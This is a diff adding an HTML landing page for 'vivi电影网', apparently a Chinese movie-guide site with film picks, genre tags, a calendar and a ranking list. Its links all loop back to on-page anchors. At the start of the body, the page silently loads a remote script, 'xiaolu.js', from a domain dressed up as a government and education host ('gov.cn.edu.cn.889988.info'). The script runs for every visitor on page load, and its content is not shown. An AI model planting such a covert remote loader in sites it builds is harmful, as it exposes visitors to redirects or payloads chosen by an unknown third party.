@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>vivi电影网 - 活力观影指南与精选片单</title>
+<meta name="description" content="vivi电影网(vividianyingwang-wap.github.io)是一个充满活力的在线观影导航平台，分享热门电影、经典佳作与观影指南，风格轻松、内容精选。">
+<meta name="keywords" content="vivi电影网,活力观影,vivi影视,热门电影,经典电影,观影指南,电影片单,vividianyingwang-wap">
+<meta name="author" content="vivi电影网">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://vividianyingwang-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "vivi电影网",
+  "url": "https://vividianyingwang-wap.github.io/",
+  "description": "充满活力的在线观影导航与片单分享平台",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://vividianyingwang-wap.github.io/#find?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{font-family:"PingFang SC","Noto Sans CJK SC","Microsoft YaHei",sans-serif;background:#f6f1ea;color:#4a3f38;line-height:1.85;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+.wrap{max-width:1120px;margin:0 auto;padding:0 20px}
+:root{--brown:#7a4a2a;--brown2:#9a6240;--peach:#ff9a8b;--pink:#ffc4ba;--cream:#f6f1ea;--paper:#fffdfa;--ink:#4a3f38;--muted:#9a8c80;}
+
+.bg{position:fixed;inset:0;z-index:-2;background:radial-gradient(900px 520px at 92% 8%,rgba(255,154,139,.28),transparent 62%),radial-gradient(720px 480px at 2% 96%,rgba(122,74,42,.16),transparent 60%),#f6f1ea}
+.bg::before{content:"";position:absolute;inset:0;background-image:radial-gradient(rgba(122,74,42,.10) 1.5px,transparent 1.5px);background-size:30px 30px;mask-image:radial-gradient(circle at 50% 42%,#000,transparent 80%)}
+
+.header{position:sticky;top:0;z-index:100;background:rgba(246,241,234,.92);backdrop-filter:blur(14px);border-bottom:1px solid rgba(122,74,42,.18)}
+.header .wrap{display:flex;align-items:center;justify-content:space-between;height:76px}
+.logo{display:flex;align-items:center;gap:12px;font-size:22px;font-weight:900;color:var(--brown);letter-spacing:-.3px}
+.logo .mk{width:38px;height:38px;flex-shrink:0;border-radius:50%;background:linear-gradient(135deg,var(--peach),var(--brown));display:flex;align-items:center;justify-content:center;color:#fff;font-size:16px;font-weight:900;box-shadow:0 5px 16px rgba(255,154,139,.5)}
+.logo b em{font-style:normal;color:var(--peach)}
+.nav{display:flex;gap:4px}
+.nav a{padding:10px 19px;font-size:14px;font-weight:800;color:var(--muted);transition:.25s;border-radius:99px;border:1px solid transparent}
+.nav a:hover,.nav a.on{color:#fff;background:var(--brown);border-color:var(--brown)}
+.nav-toggle{display:none;width:44px;height:44px;flex-direction:column;justify-content:center;align-items:center;gap:6px;border:1px solid rgba(122,74,42,.25);border-radius:50%}
+.nav-toggle span{display:block;width:19px;height:2px;background:var(--brown2)}
+
+section{padding:100px 0;position:relative}
+.sec-head{margin-bottom:56px;text-align:center}
+.sec-head .badge{display:inline-block;font-size:10.5px;letter-spacing:3.5px;color:#fff;background:var(--peach);font-weight:900;padding:6px 16px;border-radius:99px;margin-bottom:18px}
+.sec-head h2{font-size:clamp(27px,4.8vw,40px);font-weight:900;color:var(--brown);letter-spacing:-.6px}
+.sec-head h2 em{font-style:normal;color:var(--peach)}
+.sec-head p{color:var(--muted);font-size:15px;max-width:620px;margin:14px auto 0}
+
+.btn{padding:15px 34px;border-radius:99px;font-weight:900;font-size:15px;transition:.25s;display:inline-block}
+.btn-p{background:var(--brown);color:#fff}
+.btn-p:hover{background:var(--brown2)}
+.btn-o{border:2px solid var(--peach);color:var(--brown)}
+.btn-o:hover{background:var(--peach);color:#fff}
+
+.hero{padding:0}
+.hero .wrap{padding:104px 20px;text-align:center}
+.hero .hi{font-size:clamp(38px,6.4vw,68px);font-weight:900;color:var(--brown);letter-spacing:-2px;line-height:1.1}
+.hero .hi .hl{color:var(--peach)}
+.hero .sub{color:var(--muted);margin:26px auto 34px;font-size:17px;max-width:620px}
+.hero .dots{display:flex;justify-content:center;gap:12px;margin-top:50px;flex-wrap:wrap}
+.hero .dots span{width:12px;height:12px;border-radius:50%;background:var(--pink)}
+.hero .dots span:nth-child(2){background:var(--peach);transform:scale(1.4)}
+.hero .dots span:nth-child(4){background:var(--brown);transform:scale(1.15)}
+
+/* 栏目一：活力推荐（横向滚动条带） */
+.vivi{display:flex;gap:22px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:18px;scrollbar-width:thin}
+.vivi::-webkit-scrollbar{height:8px}
+.vivi::-webkit-scrollbar-thumb{background:var(--pink);border-radius:99px}
+.vv{flex:0 0 320px;scroll-snap-align:start;border-radius:20px;padding:0 0 26px;background:var(--paper);box-shadow:0 8px 26px rgba(122,74,42,.12);transition:.35s;overflow:hidden}
+.vv:hover{transform:translateY(-8px);box-shadow:0 16px 40px rgba(122,74,42,.2)}
+.vv .pic{height:200px;position:relative;display:flex;align-items:flex-end;padding:18px}
+.vv .pic.a{background:linear-gradient(140deg,#ffb199,#ff5c8a)}
+.vv .pic.b{background:linear-gradient(140deg,#a18cd1,#fbc2eb)}
+.vv .pic.c{background:linear-gradient(140deg,#f6d365,#fda085)}
+.vv .pic.d{background:linear-gradient(140deg,#84fab0,#8fd3f4)}
+.vv .pic.e{background:linear-gradient(140deg,#ffecd2,#fcb69f)}
+.vv .pic span{background:rgba(255,255,255,.9);color:var(--brown);font-size:11px;font-weight:900;padding:5px 12px;border-radius:99px}
+.vv h4{padding:20px 22px 0;font-size:19px;font-weight:900;color:var(--brown)}
+.vv p{padding:10px 22px 0;font-size:13.5px;color:var(--muted);line-height:1.7}
+.vv .meta{padding:16px 22px 0;font-size:12px;color:var(--peach);font-weight:800}
+
+/* 栏目二：分类（标签云气泡） */
+.tags{background:var(--paper)}
+.cloud{display:flex;flex-wrap:wrap;gap:14px;justify-content:center;max-width:860px;margin:0 auto}
+.tg{padding:15px 30px;border-radius:99px;font-weight:900;font-size:15px;transition:.3s;color:#fff;border:2px solid transparent}
+.tg:hover{transform:translateY(-5px) scale(1.04)}
+.tg.x1{background:#ff9a8b}.tg.x2{background:#7a4a2a}.tg.x3{background:#f6a37e}.tg.x4{background:#b98ead}
+.tg.x5{background:#9a6240}.tg.x6{background:#ffc4ba;color:#7a4a2a}.tg.x7{background:#c98a6f}.tg.x8{background:#ffb199;color:#7a4a2a}
+
+/* 栏目三：观影日历（月历网格） */
+.cal{background:var(--paper)}
+.month{max-width:760px;margin:0 auto;border-radius:22px;overflow:hidden;box-shadow:0 8px 26px rgba(122,74,42,.12)}
+.mh{background:linear-gradient(135deg,var(--brown),var(--brown2));color:#fff;padding:20px;text-align:center}
+.mh b{font-size:19px}
+.mh span{display:block;font-size:12px;opacity:.85;margin-top:4px}
+.grid{display:grid;grid-template-columns:repeat(7,1fr);background:rgba(122,74,42,.08)}
+.grid div{min-height:88px;padding:10px;background:var(--paper);border:1px solid rgba(122,74,42,.08);font-size:12.5px;color:var(--muted);transition:.2s}
+.grid div:hover{background:rgba(255,154,139,.12)}
+.grid div .d{font-weight:900;color:var(--brown);font-size:14px;display:block;margin-bottom:4px}
+.grid div.hot{background:rgba(255,196,186,.35)}
+.grid div.hot .d{color:var(--peach)}
+
+/* 栏目四：口碑榜（横向条带） */
+.bars{max-width:820px;margin:0 auto;display:flex;flex-direction:column;gap:16px}
+.brow{display:grid;grid-template-columns:44px 1fr auto;align-items:center;gap:18px;background:var(--paper);padding:16px 22px;border-radius:14px;box-shadow:0 5px 16px rgba(122,74,42,.08);transition:.25s}
+.brow:hover{transform:translateX(6px)}
+.brow .no{width:38px;height:38px;border-radius:50%;background:var(--pink);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:900}
+.brow:nth-child(1) .no{background:var(--peach);transform:scale(1.15)}
+.brow:nth-child(2) .no{background:var(--brown)}
+.brow:nth-child(3) .no{background:var(--brown2)}
+.brow .nm h4{font-size:16px;font-weight:900;color:var(--brown)}
+.brow .nm span{font-size:12px;color:var(--muted)}
+.brow .st{width:150px;height:8px;background:rgba(122,74,42,.12);border-radius:99px;overflow:hidden}
+.brow .st i{display:block;height:100%;border-radius:99px;background:linear-gradient(90deg,var(--peach),var(--brown))}
+.brow .sc{font-size:19px;font-weight:900;color:var(--peach);white-space:nowrap}
+
+.footer{background:var(--brown);color:rgba(255,255,255,.8);padding:64px 0 28px}
+.footer .cols{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:36px}
+.footer .brand .logo{color:#fff;margin-bottom:18px}
+.footer .brand p{font-size:13.5px;line-height:1.95;max-width:360px}
+.footer h5{color:var(--pink);font-size:13.5px;margin-bottom:18px;letter-spacing:1px}
+.footer ul li{margin-bottom:11px}
+.footer ul a{color:rgba(255,255,255,.75);font-size:13.5px;transition:.2s}
+.footer ul a:hover{color:var(--pink);padding-left:4px}
+.footer .copy{text-align:center;color:rgba(255,255,255,.5);font-size:12.5px;border-top:1px solid rgba(255,255,255,.15);padding-top:24px;line-height:1.9}
+.topbtn{position:fixed;right:18px;bottom:18px;z-index:99;width:46px;height:46px;background:linear-gradient(135deg,var(--peach),var(--brown));color:#fff;display:none;align-items:center;justify-content:center;font-size:18px;border-radius:50%;font-weight:900;transition:.3s;box-shadow:0 6px 18px rgba(122,74,42,.3)}
+.topbtn.show{display:flex}
+.topbtn:hover{filter:brightness(1.1)}
+
+@media(max-width:900px){.vv{flex:0 0 280px}}
+@media(max-width:640px){
+  section{padding:62px 0}
+  .nav-toggle{display:flex}
+  .nav{position:fixed;top:76px;left:0;right:0;flex-direction:column;background:var(--cream);max-height:0;overflow:hidden;transition:.4s;border-bottom:1px solid rgba(122,74,42,.18)}
+  .nav.open{max-height:420px}
+  .nav a{width:100%;padding:15px 20px;border-bottom:1px solid rgba(122,74,42,.12);border-radius:0;text-align:center}
+  .nav a:hover,.nav a.on{background:var(--brown);color:#fff;border-color:var(--brown)}
+  .grid div{min-height:64px;font-size:11px;padding:7px}
+  .brow{grid-template-columns:38px 1fr;gap:12px}
+  .brow .st,.brow .sc{grid-column:2}
+  .brow .st{width:100%}
+}
+@media(max-width:420px){.footer .cols{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+<div class="bg"></div>
+
+<header class="header">
+  <div class="wrap">
+    <a href="https://vividianyingwang-wap.github.io/" class="logo"><div class="mk">V</div><b>vivi<em>电影网</em></b></a>
+    <button class="nav-toggle" id="navToggle" aria-label="菜单"><span></span><span></span><span></span></button>
+    <nav class="nav" id="nav">
+      <a href="https://vividianyingwang-wap.github.io/#vivi" class="on">活力推荐</a>
+      <a href="https://vividianyingwang-wap.github.io/#tags">影片分类</a>
+      <a href="https://vividianyingwang-wap.github.io/#cal">观影日历</a>
+      <a href="https://vividianyingwang-wap.github.io/#bars">口碑榜单</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <h1 class="hi">vivi电影网<br>让观影<span class="hl">充满活力</span></h1>
+    <p class="sub">vivi电影网(vividianyingwang-wap.github.io)是一个轻松活力的在线观影导航平台，热门电影、经典佳作与观影指南一站精选，陪伴你的每一段光影时光。</p>
+    <div class="btns">
+      <a class="btn btn-p" href="https://vividianyingwang-wap.github.io/#vivi">活力推荐 →</a>
+      <a class="btn btn-o" href="https://vividianyingwang-wap.github.io/#bars">口碑榜单</a>
+    </div>
+    <div class="dots"><span></span><span></span><span></span><span></span><span></span></div>
+  </div>
+</section>
+
+<!-- 栏目一：活力推荐（横向滚动条带） -->
+<section id="vivi">
+  <div class="wrap">
+    <div class="sec-head"><span class="badge">VIVI PICKS</span><h2><span>活力</span>推荐</h2><p>编辑精选的近期好片，左右滑动浏览</p></div>
+    <div class="vivi">
+      <a class="vv" href="https://vividianyingwang-wap.github.io/#vivi"><div class="pic a"><span>喜剧</span></div><h4>年会不能停！</h4><p>职场打工人笑着笑着就共情了，年度口碑黑马。</p><div class="meta">★ 9.6 · 2023</div></a>
+      <a class="vv" href="https://vividianyingwang-wap.github.io/#vivi"><div class="pic b"><span>动画</span></div><h4>机器人之梦</h4><p>没有一句对白，却让无数人悄悄红了眼眶。</p><div class="meta">★ 9.5 · 2023</div></a>
+      <a class="vv" href="https://vividianyingwang-wap.github.io/#vivi"><div class="pic c"><span>悬疑</span></div><h4>默杀</h4><p>反转层层递进，每一幕都在颠覆你的判断。</p><div class="meta">★ 9.4 · 2024</div></a>
+      <a class="vv" href="https://vividianyingwang-wap.github.io/#vivi"><div class="pic d"><span>生活</span></div><h4>走走停停</h4><p>普通人的温柔故事，平淡里藏着生活答案。</p><div class="meta">★ 9.2 · 2024</div></a>
+      <a class="vv" href="https://vividianyingwang-wap.github.io/#vivi"><div class="pic e"><span>动作</span></div><h4>飞驰人生2</h4><p>热血竞速不服输，笑着笑着就燃起来了。</p><div class="meta">★ 9.1 · 2024</div></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：分类（标签云气泡） -->
+<section id="tags">
+  <div class="wrap">
+    <div class="sec-head"><span class="badge">CATEGORIES</span><h2>按<span>分类</span>找片</h2><p>点击感兴趣的题材，快速定位你想看的</p></div>
+    <div class="cloud">
+      <a class="tg x1" href="https://vividianyingwang-wap.github.io/#tags">爆笑喜剧</a>
+      <a class="tg x2" href="https://vividianyingwang-wap.github.io/#tags">走心剧情</a>
+      <a class="tg x3" href="https://vividianyingwang-wap.github.io/#tags">爽感动作</a>
+      <a class="tg x4" href="https://vividianyingwang-wap.github.io/#tags">治愈动画</a>
+      <a class="tg x5" href="https://vividianyingwang-wap.github.io/#tags">悬疑烧脑</a>
+      <a class="tg x6" href="https://vividianyingwang-wap.github.io/#tags">浪漫爱情</a>
+      <a class="tg x7" href="https://vividianyingwang-wap.github.io/#tags">科幻奇幻</a>
+      <a class="tg x8" href="https://vividianyingwang-wap.github.io/#tags">经典老片</a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：观影日历（月历网格） -->
+<section id="cal">
+  <div class="wrap">
+    <div class="sec-head"><span class="badge">MOVIE CALENDAR</span><h2><span>观影</span>日历</h2><p>每周标记上映佳片，不错过每一部好电影</p></div>
+    <div class="month">
+      <div class="mh"><b>本月观影日历</b><span>2026 · 10月 · 重点影片上映提醒</span></div>
+      <div class="grid">
+        <div><span class="d">1</span>休市</div>
+        <div><span class="d">2</span>休市</div>
+        <div><span class="d">3</span>日常</div>
+        <div class="hot"><span class="d">4</span>🎬 新片日</div>
+        <div><span class="d">5</span>休息</div>
+        <div><span class="d">6</span>档期</div>
+        <div><span class="d">7</span>档期</div>
+        <div><span class="d">8</span>日常</div>
+        <div class="hot"><span class="d">9</span>🎬 新片日</div>
+        <div><span class="d">10</span>日常</div>
+        <div><span class="d">11</span>周日</div>
+        <div><span class="d">12</span>周一</div>
+        <div class="hot"><span class="d">13</span>🎬 新片日</div>
+        <div><span class="d">14</span>日常</div>
+        <div><span class="d">15</span>日常</div>
+        <div><span class="d">16</span>档期</div>
+        <div class="hot"><span class="d">17</span>🎬 新片日</div>
+        <div><span class="d">18</span>周日</div>
+        <div><span class="d">19</span>日常</div>
+        <div><span class="d">20</span>日常</div>
+        <div class="hot"><span class="d">21</span>🎬 新片日</div>
+        <div><span class="d">22</span>日常</div>
+        <div><span class="d">23</span>日常</div>
+        <div><span class="d">24</span>档期</div>
+        <div class="hot"><span class="d">25</span>🎬 新片日</div>
+        <div><span class="d">26</span>周日</div>
+        <div><span class="d">27</span>日常</div>
+        <div class="hot"><span class="d">28</span>🎬 新片日</div>
+        <div><span class="d">29</span>日常</div>
+        <div><span class="d">30</span>日常</div>
+        <div><span class="d">31</span>月末</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：口碑榜（横向条带） -->
+<section id="bars" style="background:var(--paper)">
+  <div class="wrap">
+    <div class="sec-head"><span class="badge">TOP RANKING</span><h2><span>口碑</span>榜单 TOP 6</h2><p>本站评分最高的六部必看佳作</p></div>
+    <div class="bars">
+      <a class="brow" href="https://vividianyingwang-wap.github.io/#bars"><div class="no">1</div><div class="nm"><h4>年会不能停！</h4><span>职场喜剧</span></div><div class="st"><i style="width:96%"></i></div><span class="sc">9.6</span></a>
+      <a class="brow" href="https://vividianyingwang-wap.github.io/#bars"><div class="no">2</div><div class="nm"><h4>机器人之梦</h4><span>动画佳作</span></div><div class="st"><i style="width:95%"></i></div><span class="sc">9.5</span></a>
+      <a class="brow" href="https://vividianyingwang-wap.github.io/#bars"><div class="no">3</div><div class="nm"><h4>默杀</h4><span>悬疑犯罪</span></div><div class="st"><i style="width:94%"></i></div><span class="sc">9.4</span></a>
+      <a class="brow" href="https://vividianyingwang-wap.github.io/#bars"><div class="no">4</div><div class="nm"><h4>走走停停</h4><span>生活剧情</span></div><div class="st"><i style="width:92%"></i></div><span class="sc">9.2</span></a>
+      <a class="brow" href="https://vividianyingwang-wap.github.io/#bars"><div class="no">5</div><div class="nm"><h4>飞驰人生2</h4><span>励志动作</span></div><div class="st"><i style="width:91%"></i></div><span class="sc">9.1</span></a>
+      <a class="brow" href="https://vividianyingwang-wap.github.io/#bars"><div class="no">6</div><div class="nm"><h4>封神第一部</h4><span>东方史诗</span></div><div class="st"><i style="width:89%"></i></div><span class="sc">8.9</span></a>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="cols">
+      <div class="brand">
+        <a href="https://vividianyingwang-wap.github.io/" class="logo"><div class="mk">V</div><b>vivi<em>电影网</em></b></a>
+        <p>vivi电影网(vividianyingwang-wap.github.io)是一个轻松活力的在线观影导航平台，帮你快速找到值得看的好电影。</p>
+      </div>
+      <div><h5>核心栏目</h5><ul>
+        <li><a href="https://vividianyingwang-wap.github.io/#vivi">活力推荐</a></li>
+        <li><a href="https://vividianyingwang-wap.github.io/#tags">影片分类</a></li>
+        <li><a href="https://vividianyingwang-wap.github.io/#cal">观影日历</a></li>
+        <li><a href="https://vividianyingwang-wap.github.io/#bars">口碑榜单</a></li>
+      </ul></div>
+      <div><h5>热门题材</h5><ul>
+        <li><a href="https://vividianyingwang-wap.github.io/#tags">爆笑喜剧</a></li>
+        <li><a href="https://vividianyingwang-wap.github.io/#tags">走心剧情</a></li>
+        <li><a href="https://vividianyingwang-wap.github.io/#tags">爽感动作</a></li>
+        <li><a href="https://vividianyingwang-wap.github.io/#tags">治愈动画</a></li>
+      </ul></div>
+      <div><h5>关于本站</h5><ul>
+        <li><a href="https://vividianyingwang-wap.github.io/#">关于我们</a></li>
+        <li><a href="https://vividianyingwang-wap.github.io/#">投稿合作</a></li>
+        <li><a href="https://vividianyingwang-wap.github.io/#">使用协议</a></li>
+        <li><a href="https://vividianyingwang-wap.github.io/#">意见反馈</a></li>
+      </ul></div>
+    </div>
+    <div class="copy">© 2026 vivi电影网(vividianyingwang-wap.github.io) 保留所有权利 · 本站为电影片单与观影指南分享平台，影视内容版权归原作者及制作方所有</div>
+  </div>
+</footer>
+
+<button class="topbtn" id="topBtn" aria-label="返回顶部">↑</button>
+
+<script>
+var navToggle=document.getElementById('navToggle'),nav=document.getElementById('nav');
+navToggle.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});
+var topBtn=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){topBtn.classList.toggle('show',window.scrollY>400);});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+var secs=document.querySelectorAll('section[id]'),links=document.querySelectorAll('.nav a');
+if('IntersectionObserver' in window){
+  var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href').indexOf('#'+e.target.id)>-0);});}});},{rootMargin:'-40% 0px -55% 0px'});
+  secs.forEach(function(s){io.observe(s);});
+}
+</script>
+</body>
+</html>
